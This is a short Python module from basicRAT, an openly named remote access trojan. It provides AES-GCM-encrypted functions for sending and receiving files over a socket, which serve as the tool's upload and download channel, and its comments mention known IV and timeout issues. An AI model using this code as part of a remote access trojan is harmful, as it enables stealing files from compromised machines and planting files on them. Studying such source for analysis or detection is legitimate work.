# -*- coding: utf-8 -*-

#
# basicRAT filesock module
# https://github.com/vesche/basicRAT
#

import socket
import struct

from crypto import sendGCM
from crypto import recvGCM


# recieve a file from a socket (download)
def recvfile(sock, GCM_obj, fname):
    with open(fname, 'wb') as f:
        data = 1
        while data:
            # might be necessary to do a timeout somewhere in here
            # sock.settimeout(2)
            data = recvGCM(sock, GCM_obj)
            f.write(data)


# send a file over a socket (upload)
def sendfile(sock, GCM_obj, IV, fname):
    with open(fname, 'rb') as f:
        res = f.read(4096)
        while len(res):
            sendGCM(sock, GCM_obj, IV, res)
            IV += 1 # this is going to cause issues later, IV is local here
            res = f.read(4096)
        # sock.send('\x00\x00\x00\x00') # EOF
